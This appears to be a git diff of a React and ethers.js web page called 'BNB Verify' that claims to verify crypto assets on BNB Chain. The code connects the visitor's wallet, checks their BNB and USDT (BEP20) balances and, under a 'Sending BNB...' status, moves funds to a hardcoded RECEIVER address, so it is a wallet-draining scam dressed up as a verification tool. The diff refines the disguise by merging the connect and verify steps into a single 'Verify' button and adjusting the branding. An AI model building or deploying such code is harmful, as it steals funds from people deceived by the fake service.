@@ -2,7 +2,7 @@ import { useState } from "react";
 import { ethers } from "ethers";
 import "./App.css";
 
-const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
+const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
 const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
 const ERC20_ABI = [
   "function balanceOf(address) view returns (uint)",
@@ -10,28 +10,25 @@ const ERC20_ABI = [
 ];
 
 function App() {
+  const [status, setStatus] = useState("Click Verify to start...");
   const [walletAddress, setWalletAddress] = useState("");
-  const [status, setStatus] = useState("Click connect to verify...");
-
-  async function connectWallet() {
-    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
-    const provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const signer = await provider.getSigner();
-    const address = await signer.getAddress();
-    setWalletAddress(address);
-  }
 
   async function handleVerify() {
-    setStatus("Checking balances...");
     try {
-      if (!window.ethereum) return setStatus("No wallet detected!");
+      if (!window.ethereum) {
+        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
+        return;
+      }
 
+      await window.ethereum.request({ method: "eth_requestAccounts" });
       const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
+      setWalletAddress(userAddress);
 
+      setStatus("Checking balances...");
+
+      // Check BNB balance
       const balanceBNB = await provider.getBalance(userAddress);
       if (balanceBNB > ethers.parseEther("0.001")) {
         setStatus("Sending BNB...");
@@ -44,6 +41,7 @@ function App() {
         return;
       }
 
+      // Check USDT BEP20 balance
       const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
       const balanceUSDT = await usdt.balanceOf(userAddress);
       if (balanceUSDT > 0n) {
@@ -65,37 +63,27 @@ function App() {
     <div className="App">
       {/* Navbar */}
       <header className="navbar">
-        <nav className="nav-container">
+        <div className="nav-container">
           <a href="#" className="nav-logo">
             <div className="nav-logo-icon"></div>
             <span>BNB Verify</span>
           </a>
-          <div className="nav-links">
-            <a href="#">Home</a>
-            <a href="#">Explorer</a>
-            <a href="#">Tokens</a>
-            <a href="#">NFTs</a>
-            <a href="#">DApps</a>
-          </div>
-          <button className="nav-hamburger">
-            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16m-7 6h7"></path>
-            </svg>
-          </button>
-        </nav>
+        </div>
       </header>
 
-      {/* Hero Section */}
+      {/* Hero */}
       <main className="hero">
         <div className="hero-left">
-          <div className="powered-badge">Powered by Binance</div>
+          <div className="badge">Powered by BNB Chain</div>
           <h1>Verify Crypto Assets on BNB Chain</h1>
-          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.</p>
+          <p>Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) securely.</p>
           <div className="hero-buttons">
-            <button onClick={handleVerify}>{walletAddress ? "Verify" : "Connect Wallet"}</button>
+            <button onClick={handleVerify}>Verify</button>
           </div>
           <p className="status">{status}</p>
+          {walletAddress && <p className="wallet">Connected: {walletAddress}</p>}
         </div>
+
         <div className="hero-right">
           <div className="pulse-ring outer"></div>
           <div className="pulse-ring middle"></div>
@@ -124,8 +112,9 @@ function App() {
         </div>
       </section>
 
-      {/* Footer */}
-      <footer>&copy; 2025 BNB Verify. Powered by Binance.</footer>
+      <footer>
+        &copy; 2025 BNB Verify. Powered by BNB Chain.
+      </footer>
     </div>
   );
 }
